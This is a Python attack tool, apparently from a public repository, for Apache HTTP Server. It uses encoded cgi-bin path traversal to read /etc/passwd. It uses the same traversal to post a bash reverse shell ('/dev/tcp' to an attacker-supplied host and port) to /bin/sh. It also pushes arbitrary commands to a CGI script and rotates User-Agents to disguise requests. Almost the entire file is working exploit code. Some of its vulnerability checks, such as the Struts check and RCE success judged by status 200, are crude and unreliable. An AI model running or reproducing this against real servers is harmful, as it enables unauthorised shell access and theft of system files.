import argparse
import requests
import struct
import socket
import sys
import random  # Import random for random User-Agent selection

def header():
    print('''
 ▗▄▖▗▄▄▖ ▗▄▖ ▗▄▄▗▖ ▗▗▄▄▄▖     ▗▄▄▖▗▄▄▖▗▄▖▗▖  ▗▗▖  ▗▗▄▄▄▗▄▄▖ 
▐▌ ▐▐▌ ▐▐▌ ▐▐▌  ▐▌ ▐▐▌       ▐▌  ▐▌  ▐▌ ▐▐▛▚▖▐▐▛▚▖▐▐▌  ▐▌ ▐▌
▐▛▀▜▐▛▀▘▐▛▀▜▐▌  ▐▛▀▜▐▛▀▀▘     ▝▀▚▐▌  ▐▛▀▜▐▌ ▝▜▐▌ ▝▜▐▛▀▀▐▛▀▚▖
▐▌ ▐▐▌  ▐▌ ▐▝▚▄▄▐▌ ▐▐▙▄▄▖    ▗▄▄▞▝▚▄▄▐▌ ▐▐▌  ▐▐▌  ▐▐▙▄▄▐▌ ▐▌
                        https://github.com/Yqno                                    
                                                            ''')

def print_custom_help():
    print('''\
Usage: ApacheScanner.py [options]

Apache HTTP Server scanning and overtaking tool written by Yqno.

Options:
  -h, --help            Show this help message and exit
  -u URL, --url URL     The target URL of your Apache HTTP Server (default is http://localhost:8080)
  -t TIMEOUT, --timeout TIMEOUT
                        The timeout of the request in seconds (default is 25)
  -p PORT, --port PORT  The port number of your Apache HTTP Server (default port is 80)
  -c COMMAND, --command COMMAND
                        The command to be executed on your Apache HTTP Server (default is ls -l)
  --rce                 Enable remote code execution on your Apache HTTP Server (default is False)
  --cmd CMD             Command to run if RCE is enabled (default is whoami)
  --lhost LHOST         Attacker IP for reverse shell (required if --rce is enabled)
  --lport LPORT         Attacker listening port for reverse shell (required if --rce is enabled)
''')

def main():
    parser = argparse.ArgumentParser(description='Apache HTTP Server overtaking tool written by Yqno.')

    parser.add_argument('-u', '--url', type=str, help='The target URL of your Apache HTTP Server (default is localhost)', default='http://localhost:8080')
    parser.add_argument('-t', '--timeout', type=int, help='The timeout of the request in seconds (default is 25)', default=25)
    parser.add_argument('-p', '--port', type=int, help='The port number of your Apache HTTP Server (default port is 80)', default=80)
    parser.add_argument('-c', '--command', type=str, help='The command to be executed on your Apache HTTP Server (default is ls -l)', default='ls -l')
    parser.add_argument('--rce', action='store_true', help='Enable remote code execution on your Apache HTTP Server (default is False)', default=False)
    parser.add_argument('--cmd', type=str, help='Command to run if RCE is enabled (default is whoami)', default="whoami")
    parser.add_argument('--lhost', type=str, help='Attacker IP for reverse shell (required if --rce is enabled)', required=True)
    parser.add_argument('--lport', type=int, help='Attacker listening port for reverse shell (required if --rce is enabled)', required=True)

    args = parser.parse_args()

    # Check if the user requested help
    if '--help' in sys.argv or '-h' in sys.argv:
        print_custom_help()
        sys.exit()

    # Proceed with the rest of the script
    exploiter = Exploiter(args.url, args.timeout, args.port, args.command, args.rce, args.cmd, args.lhost, args.lport)
    exploiter.run_checks()

class Exploiter:
    def __init__(self, url, timeout, port, command, rce, cmd, lhost, lport):
        self.url = url
        self.timeout = timeout
        self.port = port
        self.command = command
        self.rce = rce
        self.cmd = cmd
        self.lhost = lhost
        self.lport = lport

        # List of User-Agents
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0',
            'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; Nexus 7 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
        ]
        
        # Randomly choose a User-Agent for each request
        random_user_agent = random.choice(user_agents)

        self.headers = {
            'User-Agent': random_user_agent,
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
        }

    # Path Traversal Check
    def check_pathtraversal(self):
        print(f"[*] Checking for path traversal vulnerability on {self.url}")
        payload = "../../../../etc/passwd"
        target = f"{self.url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/{payload}"

        try:
            response = requests.get(target, headers=self.headers, timeout=self.timeout)
            if "root:x:" in response.text:
                print("[+] Path traversal vulnerability found! Succeeded.")
                print(response.text)
            else:
                print("[-] No path traversal vulnerability detected.")
        except Exception as e:
            print(f"[!] Error: {e}")

    # Remote Code Execution Check
    def check_rce(self):
        print(f"[*] Checking for remote code execution vulnerability on {self.url}")
        target = f"{self.url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        data = {"echo": payload}

        try:
            response = requests.post(target, data=data, headers=self.headers, timeout=self.timeout)
            if response.status_code == 200:
                print("[+] Remote code execution vulnerability found! RCE triggered.")
            else:
                print("[-] No remote code execution vulnerability detected.")
        except Exception as e:
            print(f"[!] Error: {e}")

    # Apache Struts RCE Check
    def check_apache_struts_rce(self):
        print(f"[*] Checking for Apache Struts RCE vulnerability on {self.url}")
        target = f"{self.url}/struts2-showcase/"

        try:
            response = requests.get(target, headers=self.headers, timeout=self.timeout)
            if "Struts 2 Showcase" in response.text:
                print("[+] Apache Struts RCE vulnerability found!")
            else:
                print("[-] No Apache Struts RCE vulnerability detected.")
        except Exception as e:
            print(f"[!] Error: {e}")

    # Command Execution Check
    def check_command_execution(self):
        print(f"[*] Checking for command execution vulnerability on {self.url}")
        target = f"{self.url}/cgi-bin/test.cgi"
        payload = self.command

        try:
            response = requests.post(target, data={"cmd": payload}, headers=self.headers, timeout=self.timeout)
            if response.status_code == 200:
                print("[+] Command execution vulnerability found!")
                print(response.text)
            else:
                print("[-] No command execution vulnerability detected.")
        except Exception as e:
            print(f"[!] Error: {e}")

    # Run all checks
    def run_checks(self):
        self.check_pathtraversal()
        if self.rce:
            self.check_rce()
        self.check_apache_struts_rce()
        self.check_command_execution()

if __name__ == "__main__":
    header()
    main()
